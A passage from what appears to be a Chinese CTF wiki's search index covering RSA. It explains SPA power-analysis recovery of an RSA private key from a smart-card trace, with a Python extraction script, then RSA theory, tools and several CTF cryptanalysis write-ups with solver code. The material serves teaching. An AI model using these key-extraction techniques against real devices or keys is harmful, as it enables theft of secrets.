014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046 \u5206\u6790 \u00b6 \u7531\u4e8e\u7f51\u7ad9\u53ea\u7ed9\u51fa\u4e86\u4e00\u6761\u80fd\u91cf\u8ff9\uff0c\u6240\u4ee5\u53ef\u4ee5\u65ad\u5b9a\u8fd9\u662f Simple channel analysis\uff08SPA\uff09\u653b\u51fb\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u89c2\u5bdf\u80fd\u91cf\u8ff9\u7684\u9ad8\u4f4e\u7535\u5e73\u6765\u83b7\u5f97 RSA \u89e3\u5bc6\u8fc7\u7a0b\u7684\u5bc6\u94a5 d\u3002 RSA \u53ef\u88ab SPA \u653b\u51fb\u7684\u7406\u8bba\u57fa\u7840\u6765\u81ea\u4e8e RSA \u4e2d\u5305\u542b\u7684\u5feb\u901f\u5e42\u53d6\u4f59\u7b97\u6cd5\u3002 \u5feb\u901f\u5e42\u7b97\u6cd5\u5982\u4e0b b \u4e3a\u5076\u6570\u65f6\uff0c a^b \\bmod c = ({a^2}^{b/2}) \\bmod c a^b \\bmod c = ({a^2}^{b/2}) \\bmod c \u3002 b \u4e3a\u5947\u6570\u65f6\uff0c a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c \u3002 \u76f8\u5e94\u7684 C \u4ee3\u7801\u5b9e\u73b0\u4e3a\uff1a int PowerMod ( int a , int b , int c ) { int ans = 1 ; a = a % c ; while ( b > 0 ) { if ( b % 2 == 1 ) // \u5f53b\u4e3a\u5947\u6570\u65f6\u4f1a\u591a\u6267\u884c\u4e0b\u9762\u7684\u6307\u4ee4 ans = ( ans * a ) % c ; b = b / 2 ; a = ( a * a ) % c ; } return ans ; } \u7531\u4e8e\u5feb\u901f\u5e42\u7684\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u4f1a\u9010\u4f4d\u5224\u65ad\u6307\u6570\u7684\u53d6\u503c\uff0c\u5e76\u4f1a\u91c7\u53d6\u4e0d\u540c\u7684\u64cd\u4f5c\uff0c\u6240\u4ee5\u53ef\u4ece\u80fd\u91cf\u8ff9\u4e2d\u8fd8\u539f\u51fa d \u7684\u53d6\u503c\uff08\u4ece\u4e0a\u9762\u53ef\u77e5\uff0c\u76f4\u63a5\u5f97\u5230\u7684\u503c\u662f d \u7684\u4e8c\u8fdb\u5236\u53d6\u503c\u7684 \u9006\u5e8f \uff09\u3002 \u6ce8\u610f \uff1a \u6709\u65f6\u5019\u6a21\u4e58\u4e5f\u53ef\u80fd\u4f1a\u4ece\u9ad8\u4f4d\u5411\u4f4e\u4f4d\u8fdb\u884c\u6a21\u4e58\u3002\u8fd9\u91cc\u662f\u4ece\u4f4e\u4f4d\u5411\u9ad8\u4f4d\u6a21\u4e58\u3002 \u7531\u6b64\u53ef\u7ed9\u51fa\u8fd8\u539f d \u7684\u811a\u672c\u5982\u4e0b\uff1a f = open ( './data.txt' ) data = f . read () . split ( \",\" ) print ( 'point number:' , len ( data )) start_point = 225 # \u5f00\u59cb\u5206\u6790\u7684\u70b9 mid = 50 # \u91c7\u6837\u70b9\u95f4\u9694 fence = 228 # \u9ad8\u4f4e\u7535\u5e73\u5206\u754c\u7ebf bin_array = [] for point_index in range ( start_point , len ( data ), mid ): if float ( data [ point_index ]) > fence : bin_array . append ( 1 ) else : bin_array . append ( 0 ) bin_array2 = [] flag1 = 0 flag2 = 0 for x in bin_array : if x : if flag1 : flag2 = 1 else : flag1 = 1 else : if flag2 : bin_array2 . append ( 1 ) else : bin_array2 . append ( 0 ) flag1 = 0 flag2 = 0 # d_bin = bin_array2[::-1] d_bin = bin_array2 d = \"\" . join ( str ( x ) for x in d_bin )[:: - 1 ] print ( d ) d_int = int ( d , 2 ) print ( d_int ) \u53c2\u8003\u8d44\u6599 \u00b6 Mangard, S., Oswald, E., Popp, T., \u51af\u767b\u56fd, \u5468\u6c38\u5f6c, & \u5218\u7ee7\u4e1a. (2010). \u80fd\u91cf\u5206\u6790\u653b\u51fb.","title":"RSA \u4fa7\u4fe1\u9053\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#rsa","text":"\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08\u4fa7\u4fe1\u9053\u653b\u51fb\uff09\u662f\u4e00\u79cd\u80fd\u591f\u4ece\u5bc6\u7801\u8bbe\u5907\u4e2d\u83b7\u53d6\u79d8\u5bc6\u4fe1\u606f\u7684\u5bc6\u7801\u653b\u51fb\u65b9\u6cd5\uff0e\u4e0e\u5176 \u4ed6\u653b\u51fb\u65b9\u6cd5\u4e0d\u540c\uff1a\u8fd9\u79cd\u653b\u51fb\u5229\u7528\u7684\u662f\u5bc6\u7801\u8bbe\u5907\u7684\u80fd\u91cf\u6d88\u8017\u7279\u5f81\uff0c\u800c\u975e\u5bc6\u7801\u7b97\u6cd5\u7684\u6570\u5b66\u7279\u6027\uff0e\u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u4e00\u79cd\u975e\u5165\u4fb5\u5f0f\u653b\u51fb\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u65b9\u4fbf\u5730\u8d2d\u4e70\u5b9e\u65bd\u653b\u51fb\u6240\u9700\u8981\u7684\u8bbe\u5907\uff1a\u6240\u4ee5\u8fd9\u79cd\u653b\u51fb\u5bf9\u667a\u80fd\u5361\u4e4b\u7c7b\u7684\u5bc6\u7801\u8bbe\u5907\u7684\u5b89\u5168\u6027\u9020\u6210\u4e86\u4e25\u91cd\u5a01\u80c1\u3002 \u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u5b89\u5168\u9886\u57df\u5185\u975e\u5e38\u91cd\u8981\u7684\u4e00\u4e2a\u90e8\u5206\uff0c\u6211\u4eec\u53ea\u5728\u8fd9\u91cc\u7b80\u5355\u8ba8\u8bba\u4e0b\u3002 \u80fd\u91cf\u5206\u6790\u653b\u51fb\u5206\u4e3a\uff1a - \u7b80\u5355\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08SPA\uff09\uff0c\u5373\u5bf9\u80fd\u91cf\u8ff9\u8fdb\u884c\u76f4\u89c2\u5206\u6790\uff0c\u8089\u773c\u770b\u5373\u53ef\u3002 - \u5dee\u5206\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08DPA\uff09\uff0c\u57fa\u4e8e\u80fd\u91cf\u8ff9\u4e4b\u95f4\u7684\u76f8\u5173\u7cfb\u6570\u8fdb\u884c\u5206\u6790\u3002","title":"RSA \u4fa7\u4fe1\u9053\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#_1","text":"\u653b\u51fb\u8005\u53ef\u83b7\u53d6\u4e0e\u52a0\u89e3\u5bc6\u76f8\u5173\u7684\u4fa7\u4fe1\u9053\u4fe1\u606f\uff0c\u4f8b\u5982\u80fd\u91cf\u6d88\u8017\u3001\u8fd0\u7b97\u65f6\u95f4\u3001\u7535\u78c1\u8f90\u5c04\u7b49\u7b49\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#_2","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 HITB 2017 \u7684 Hack in the card I \u4f5c\u4e3a\u4f8b\u5b50\u3002 \u9898\u76ee\u7ed9\u51fa\u4e86\u516c\u94a5\u6587\u4ef6 publickey.pem \uff0c\u5bc6\u6587\uff0c\u6d4b\u91cf\u667a\u80fd\u5361\u529f\u7387\u7684\u7535\u8def\u56fe\uff0c\u548c \u89e3\u5bc6 \u8fc7\u7a0b\u4e2d\u667a\u80fd\u5361\u6d88\u8017\u7684\u529f\u7387\u53d8\u5316\uff08\u901a\u8fc7\u5728\u7ebf\u7f51\u7ad9\u7ed9\u51fa trace \uff09\u3002 \u5bc6\u6587\uff1a 014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046","title":"\u4f8b\u5b50"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#_3","text":"\u7531\u4e8e\u7f51\u7ad9\u53ea\u7ed9\u51fa\u4e86\u4e00\u6761\u80fd\u91cf\u8ff9\uff0c\u6240\u4ee5\u53ef\u4ee5\u65ad\u5b9a\u8fd9\u662f Simple channel analysis\uff08SPA\uff09\u653b\u51fb\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u89c2\u5bdf\u80fd\u91cf\u8ff9\u7684\u9ad8\u4f4e\u7535\u5e73\u6765\u83b7\u5f97 RSA \u89e3\u5bc6\u8fc7\u7a0b\u7684\u5bc6\u94a5 d\u3002 RSA \u53ef\u88ab SPA \u653b\u51fb\u7684\u7406\u8bba\u57fa\u7840\u6765\u81ea\u4e8e RSA \u4e2d\u5305\u542b\u7684\u5feb\u901f\u5e42\u53d6\u4f59\u7b97\u6cd5\u3002 \u5feb\u901f\u5e42\u7b97\u6cd5\u5982\u4e0b b \u4e3a\u5076\u6570\u65f6\uff0c a^b \\bmod c = ({a^2}^{b/2}) \\bmod c a^b \\bmod c = ({a^2}^{b/2}) \\bmod c \u3002 b \u4e3a\u5947\u6570\u65f6\uff0c a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c \u3002 \u76f8\u5e94\u7684 C \u4ee3\u7801\u5b9e\u73b0\u4e3a\uff1a int PowerMod ( int a , int b , int c ) { int ans = 1 ; a = a % c ; while ( b > 0 ) { if ( b % 2 == 1 ) // \u5f53b\u4e3a\u5947\u6570\u65f6\u4f1a\u591a\u6267\u884c\u4e0b\u9762\u7684\u6307\u4ee4 ans = ( ans * a ) % c ; b = b / 2 ; a = ( a * a ) % c ; } return ans ; } \u7531\u4e8e\u5feb\u901f\u5e42\u7684\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u4f1a\u9010\u4f4d\u5224\u65ad\u6307\u6570\u7684\u53d6\u503c\uff0c\u5e76\u4f1a\u91c7\u53d6\u4e0d\u540c\u7684\u64cd\u4f5c\uff0c\u6240\u4ee5\u53ef\u4ece\u80fd\u91cf\u8ff9\u4e2d\u8fd8\u539f\u51fa d \u7684\u53d6\u503c\uff08\u4ece\u4e0a\u9762\u53ef\u77e5\uff0c\u76f4\u63a5\u5f97\u5230\u7684\u503c\u662f d \u7684\u4e8c\u8fdb\u5236\u53d6\u503c\u7684 \u9006\u5e8f \uff09\u3002 \u6ce8\u610f \uff1a \u6709\u65f6\u5019\u6a21\u4e58\u4e5f\u53ef\u80fd\u4f1a\u4ece\u9ad8\u4f4d\u5411\u4f4e\u4f4d\u8fdb\u884c\u6a21\u4e58\u3002\u8fd9\u91cc\u662f\u4ece\u4f4e\u4f4d\u5411\u9ad8\u4f4d\u6a21\u4e58\u3002 \u7531\u6b64\u53ef\u7ed9\u51fa\u8fd8\u539f d \u7684\u811a\u672c\u5982\u4e0b\uff1a f = open ( './data.txt' ) data = f . read () . split ( \",\" ) print ( 'point number:' , len ( data )) start_point = 225 # \u5f00\u59cb\u5206\u6790\u7684\u70b9 mid = 50 # \u91c7\u6837\u70b9\u95f4\u9694 fence = 228 # \u9ad8\u4f4e\u7535\u5e73\u5206\u754c\u7ebf bin_array = [] for point_index in range ( start_point , len ( data ), mid ): if float ( data [ point_index ]) > fence : bin_array . append ( 1 ) else : bin_array . append ( 0 ) bin_array2 = [] flag1 = 0 flag2 = 0 for x in bin_array : if x : if flag1 : flag2 = 1 else : flag1 = 1 else : if flag2 : bin_array2 . append ( 1 ) else : bin_array2 . append ( 0 ) flag1 = 0 flag2 = 0 # d_bin = bin_array2[::-1] d_bin = bin_array2 d = \"\" . join ( str ( x ) for x in d_bin )[:: - 1 ] print ( d ) d_int = int ( d , 2 ) print ( d_int )","title":"\u5206\u6790"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#_4","text":"Mangard, S., Oswald, E., Popp, T., \u51af\u767b\u56fd, \u5468\u6c38\u5f6c, & \u5218\u7ee7\u4e1a. (2010). \u80fd\u91cf\u5206\u6790\u653b\u51fb.","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/asymmetric/rsa/rsa_theory/","text":"RSA \u4ecb\u7ecd \u00b6 RSA \u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002\u5728\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u548c\u7535\u5b50\u5546\u4e1a\u4e2d RSA \u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002RSA \u662f 1977 \u5e74\u7531\u7f57\u7eb3\u5fb7\u00b7\u674e\u7ef4\u65af\u7279\uff08Ron Rivest\uff09\u3001\u963f\u8fea\u00b7\u8428\u83ab\u5c14\uff08Adi Shamir\uff09\u548c\u4f26\u7eb3\u5fb7\u00b7\u963f\u5fb7\u66fc\uff08Leonard Adleman\uff09\u4e00\u8d77\u63d0\u51fa\u7684\u3002RSA \u5c31\u662f\u4ed6\u4eec\u4e09\u4eba\u59d3\u6c0f\u5f00\u5934\u5b57\u6bcd\u62fc\u5728\u4e00\u8d77\u7ec4\u6210\u7684\u3002 RSA \u7b97\u6cd5\u7684\u53ef\u9760\u6027\u7531\u6781\u5927\u6574\u6570\u56e0\u6570\u5206\u89e3\u7684\u96be\u5ea6\u51b3\u5b9a\u3002\u6362\u8a00\u4e4b\uff0c\u5bf9\u4e00\u6781\u5927\u6574\u6570\u505a\u56e0\u6570\u5206\u89e3\u6108\u56f0\u96be\uff0cRSA \u7b97\u6cd5\u6108\u53ef\u9760\u3002\u5047\u5982\u6709\u4eba\u627e\u5230\u4e00\u79cd\u5feb\u901f\u56e0\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u7684\u8bdd\uff0c\u90a3\u4e48\u7528 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u7684\u53ef\u9760\u6027\u5c31\u80af\u5b9a\u4f1a\u6781\u5ea6\u4e0b\u964d\u3002\u4f46\u627e\u5230\u8fd9\u6837\u7684\u7b97\u6cd5\u7684\u53ef\u80fd\u6027\u662f\u975e\u5e38\u5c0f\u7684\u3002\u5982\u4eca\uff0c\u53ea\u6709\u77ed\u7684 RSA \u5bc6\u94a5\u624d\u53ef\u80fd\u88ab\u5f3a\u529b\u65b9\u5f0f\u89e3\u7834\u3002\u5230 2017 \u5e74\u4e3a\u6b62\uff0c\u8fd8\u6ca1\u6709\u4efb\u4f55\u53ef\u9760\u7684\u653b\u51fb RSA \u7b97\u6cd5\u7684\u65b9\u5f0f\u3002 \u57fa\u672c\u539f\u7406 \u00b6 \u516c\u94a5\u4e0e\u79c1\u94a5\u7684\u4ea7\u751f \u00b6 \u968f\u673a\u9009\u62e9\u4e24\u4e2a\u4e0d\u540c\u5927\u8d28\u6570 p p \u548c q q \uff0c\u8ba1\u7b97 N = p \\times q N = p \\times q \u6839\u636e\u6b27\u62c9\u51fd\u6570\uff0c\u6c42\u5f97 \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \u9009\u62e9\u4e00\u4e2a\u5c0f\u4e8e \\varphi (N) \\varphi (N) \u7684\u6574\u6570 e e \uff0c\u4f7f e e \u548c \\varphi (N) \\varphi (N) \u4e92\u8d28\u3002\u5e76\u6c42\u5f97 e e \u5173\u4e8e \\varphi (N) \\varphi (N) \u7684\u6a21\u53cd\u5143\u7d20\uff0c\u547d\u540d\u4e3a d d \uff0c\u6709 ed\\equiv 1 \\pmod {\\varphi (N)} ed\\equiv 1 \\pmod {\\varphi (N)} \u5c06 p\u200b p\u200b \u548c q\u200b q\u200b \u7684\u8bb0\u5f55\u9500\u6bc1 \u6b64\u65f6\uff0c (N,e) (N,e) \u662f\u516c\u94a5\uff0c (N,d) (N,d) \u662f\u79c1\u94a5\u3002 \u6d88\u606f\u52a0\u5bc6 \u00b6 \u9996\u5148\u9700\u8981\u5c06\u6d88\u606f \u4ee5\u4e00\u4e2a\u53cc\u65b9\u7ea6\u5b9a\u597d\u7684\u683c\u5f0f\u8f6c\u5316\u4e3a\u4e00\u4e2a\u5c0f\u4e8e N N \uff0c\u4e14\u4e0e N N \u4e92\u8d28\u7684\u6574\u6570 m m \u3002\u5982\u679c\u6d88\u606f\u592a\u957f\uff0c\u53ef\u4ee5\u5c06\u6d88\u606f\u5206\u4e3a\u51e0\u6bb5\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u5757\u52a0\u5bc6\uff0c\u540e\u5bf9\u4e8e\u6bcf\u4e00\u90e8\u5206\u5229\u7528\u5982\u4e0b\u516c\u5f0f\u52a0\u5bc6\uff1a m^{e}\\equiv c\\pmod N m^{e}\\equiv c\\pmod N \u6d88\u606f\u89e3\u5bc6 \u00b6 \u5229\u7528\u5bc6\u94a5 d\u200b d\u200b \u8fdb\u884c\u89e3\u5bc6\u3002 c^{d}\\equiv m\\pmod N c^{d}\\equiv m\\pmod N \u6b63\u786e\u6027\u8bc1\u660e \u00b6 \u5373\u6211\u4eec\u8981\u8bc1 m^{ed} \\equiv m \\bmod N m^{ed} \\equiv m \\bmod N \uff0c\u5df2\u77e5 ed \\equiv 1 \\bmod \\phi(N) ed \\equiv 1 \\bmod \\phi(N) \uff0c\u90a3\u4e48 ed=k\\phi(N)+1 ed=k\\phi(N)+1 \uff0c\u5373\u9700\u8981\u8bc1\u660e m^{k\\phi(N)+1} \\equiv m \\bmod N m^{k\\phi(N)+1} \\equiv m \\bmod N \u8fd9\u91cc\u6211\u4eec\u5206\u4e24\u79cd\u60c5\u51b5\u8bc1\u660e \u7b2c\u4e00\u79cd\u60c5\u51b5 gcd(m,N)=1\u200b gcd(m,N)=1\u200b \uff0c\u90a3\u4e48 m^{\\phi(N)} \\equiv 1 \\bmod N\u200b m^{\\phi(N)} \\equiv 1 \\bmod N\u200b \uff0c\u56e0\u6b64\u539f\u5f0f\u6210\u7acb\u3002 \u7b2c\u4e8c\u79cd\u60c5\u51b5 gcd(m,N)\\neq 1 gcd(m,N)\\neq 1 \uff0c\u90a3\u4e48 m m \u5fc5\u7136\u662f p p \u6216\u8005 q q \u7684\u500d\u6570\uff0c\u5e76\u4e14 n=m n=m \u5c0f\u4e8e N N \u3002\u6211\u4eec\u5047\u8bbe m=xp m=xp \u90a3\u4e48 x x \u5fc5\u7136\u5c0f\u4e8e q q \uff0c\u53c8\u7531\u4e8e q q \u662f\u7d20\u6570\u3002\u90a3\u4e48 m^{\\phi(q)} \\equiv 1 \\bmod q m^{\\phi(q)} \\equiv 1 \\bmod q \u8fdb\u800c m^{k\\phi(N)}=m^{k(p-1)(q-1)}=(m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q m^{k\\phi(N)}=m^{k(p-1)(q-1)}=(m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q \u90a3\u4e48 m^{k\\phi(N)+1}=m+uqm m^{k\\phi(N)+1}=m+uqm \u8fdb\u800c m^{k\\phi(N)+1}=m+uqxp=m+uxN m^{k\\phi(N)+1}=m+uqxp=m+uxN \u6240\u4ee5\u539f\u5f0f\u6210\u7acb\u3002 \u57fa\u672c\u5de5\u5177 \u00b6 RSAtool \u00b6 \u5b89\u88c5 git clone https://github.com/ius/rsatool.git cd rsatool python rsatool.py -h \u751f\u6210\u79c1\u94a5 python rsatool.py -f PEM -o private.pem -p 1234567 -q 7654321 RSA Converter \u00b6 \u6839\u636e\u7ed9\u5b9a\u5bc6\u94a5\u5bf9\uff0c\u751f\u6210 pem \u6587\u4ef6 \u6839\u636e n n \uff0c e e \uff0c d d \u5f97\u51fa p p \uff0c q q openssl \u00b6 \u67e5\u770b\u516c\u94a5\u6587\u4ef6 openssl rsa -pubin -in pubkey.pem -text -modulus \u89e3\u5bc6 rsautl -decrypt -inkey private.pem -in flag.enc -out flag \u66f4\u52a0\u5177\u4f53\u7684\u7ec6\u8282\u8bf7\u53c2\u8003 openssl --help \u3002 \u5206\u89e3\u6574\u6570\u5de5\u5177 \u00b6 \u7f51\u7ad9\u5206\u89e3\uff0c factor.db \u547d\u4ee4\u884c\u5206\u89e3\uff0c factordb-pycli \uff0c\u501f\u7528 factordb \u6570\u636e\u5e93\u3002 yafu python \u5e93 \u00b6 primefac \u00b6 \u6574\u6570\u5206\u89e3\u5e93\uff0c\u5305\u542b\u4e86\u5f88\u591a\u6574\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u3002 gmpy \u00b6 gmpy.root(a, b) \uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4 (x, y) \uff0c\u5176\u4e2d x \u4e3a a \u5f00 b \u6b21\u65b9\u7684\u503c\uff0c y \u662f\u5224\u65ad x \u662f\u5426\u4e3a\u6574\u6570\u7684\u5e03\u5c14\u578b\u53d8\u91cf gmpy2 \u00b6 \u5b89\u88c5\u65f6\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u81ea\u5df1\u53e6\u884c\u5b89\u88c5 mpfr \u4e0e mpc \u5e93\u3002 gmpy2.iroot(a, b) \uff0c\u7c7b\u4f3c\u4e8e gmpy.root(a,b) pycrypto \u00b6 \u5b89\u88c5 sudo pip install pycrypto \u4f7f\u7528 import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 msg = 'crypto here' p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) key = PKCS1_v1_5 . new ( privatekey ) msg = key . decrypt ( enc . decode ( 'base64' ), e ) Jarvis OJ - Basic - veryeasyRSA \u00b6 p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 \u6c42 d = \u8bf7\u63d0\u4ea4 PCTF{d} \u76f4\u63a5\u6839\u636e ed\\equiv 1 \\pmod{\\varphi (N)} ed\\equiv 1 \\pmod{\\varphi (N)} \uff0c\u5176\u4e2d \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \uff0c\u53ef\u5f97 d d \u3002 import gmpy2 p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 phin = ( p - 1 ) * ( q - 1 ) print gmpy2 . invert ( e , phin ) \u279c Jarvis OJ-Basic-veryeasyRSA git: ( master ) \u2717 python exp.py 19178568796155560423675975774142829153827883709027717723363077606260717434369 2018 CodeGate CTF Rsababy \u00b6 \u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684 RSA\uff0c\u4e0d\u8fc7\u7a0b\u5e8f\u8fd8\u751f\u6210\u4e86\u4e24\u4e2a\u5947\u602a\u7684\u6570 e = 65537 n = p * q pi_n = ( p - 1 ) * ( q - 1 ) d = mulinv ( e , pi_n ) h = ( d + p ) ^ ( d - p ) g = d * ( p - 0xdeadbeef ) \u6240\u4ee5\uff0c\u95ee\u9898\u5e94\u8be5\u51fa\u81ea\u8fd9\u91cc\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4ece\u6b64\u4e0b\u624b\uff0c\u4e0d\u653e\u8fd9\u91cc\u5148\u5047\u8bbe const = 0xdeadbeef \u3002\u90a3\u4e48 eg = ed * (p-const) eg = ed * (p-const) \u8fdb\u800c\uff0c\u6839\u636e RSA \u53ef\u77e5 2^{eg}=2^{ed * (p-const)}=2^{p-const} \\pmod n 2^{eg}=2^{ed * (p-const)}=2^{p-const} \\pmod n 2^{p-const} * 2^{const-1} = 2^{p-1} \\pmod n 2^{p-const} * 2^{const-1} = 2^{p-1} \\pmod n \u6240\u4ee5 2^{p-1} = 2^{eg} * 2^{const-1}+kn 2^{p-1} = 2^{eg} * 2^{const-1}+kn \u800c\u4e0e\u6b64\u540c\u65f6\u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\u6211\u4eec\u77e5\u9053 2^{p-1} \\equiv 1 \\pmod p 2^{p-1} \\equiv 1 \\pmod p \u6240\u4ee5 p|2^{p-1}-1 | 2^{eg+const-1}-1+kn p|2^{p-1}-1 | 2^{eg+const-1}-1+kn \u8fdb\u800c p|2^{eg+const-1}-1 p|2^{eg+const-1}-1 \u6240\u4ee5 p|gcd(2^{eg+const-1}-1,n) p|gcd(2^{eg+const-1}-1,n) \u56e0\u6b64\uff0c\u4ee3\u7801\u5982\u4e0b tmp = gmpy2 . powmod ( 2 , e * g + const - 1 , n ) - 1 p = gmpy2 . gcd ( tmp , n ) q = n / p phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) plain = gmpy2 . powmod ( data , d , n ) print hex ( plain )[ 2 :] . decode ( 'hex' ) 2018 \u56fd\u5bb6\u5b89\u5168\u5468 pure math \u00b6 \u9898\u76ee\u7684\u57fa\u672c\u63cf\u8ff0\u662f\u8fd9\u4e2a\u6837\u5b50\u7684 1) p ** p % q = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492 2) q ** q % p = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323 3) (p ** q + q ** p) % (p*q) = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406 4) (p+q) ** (p+q) % (p*q) = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279 5) FLAG ** 31337 % (p*q) = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030 Now, what\u2019s the FLAG??? \u6211\u4eec\u7684\u76ee\u7684\u57fa\u672c\u4e0a\u5c31\u662f\u6c42\u5f97 FLAG\uff0c\u90a3\u4e48\u600e\u4e48\u505a\u5462?\u8fd9\u4e2a\u9898\u76ee\u9700\u8981\u6211\u4eec\u5177\u6709\u8f83\u597d\u7684\u6570\u8bba\u529f\u5e95\u3002 \u6839\u636e\u9898\u76ee\u4e2d\u8fd9\u6837\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe p p \uff0c q q \u90fd\u662f\u5927\u7d20\u6570\uff0c\u90a3\u4e48 p^{q-1} \\equiv 1\\bmod q p^{q-1} \\equiv 1\\bmod q \u90a3\u4e48 p^{q} \\equiv p \\bmod pq p^{q} \\equiv p \\bmod pq \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e 3\uff09\u77e5\u9053 p^q+q^p \\equiv p+q \\bmod pq p^q+q^p \\equiv p+q \\bmod pq \u800c p+q p+q \u53c8\u663e\u7136\u5c0f\u4e8e pq pq \uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u77e5\u9053 p+q p+q \u7684\u6570\u503c\u3002 \u8fdb\u4e00\u6b65\uff0c\u6211\u4eec\u5047\u8bbe1\uff09\uff0c2\uff09\uff0c3\uff09\uff0c4\uff09\uff0c5\uff09\u5bf9\u5e94\u7684\u503c\u5206\u522b\u4e3a x_1 x_1 , x_2 x_2 , x_3 x_3 , x_4 x_4 , x_5 x_5 \u5219 \u6839\u636e4\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 (p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq (p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq \u53c8\u56e0\u4e3a1\uff09\u548c 2\uff09\uff0c\u5219 p^pp \\equiv px_1\\bmod pq p^pp \\equiv px_1\\bmod pq q^qq \\equiv qx_2 \\bmod pq q^qq \\equiv qx_2 \\bmod pq \u56e0\u6b64 px_1+qx_2 \\equiv x_4 \\bmod pq px_1+qx_2 \\equiv x_4 \\bmod pq \u6839\u636e x_1 x_1 \u548c x_2 x_2 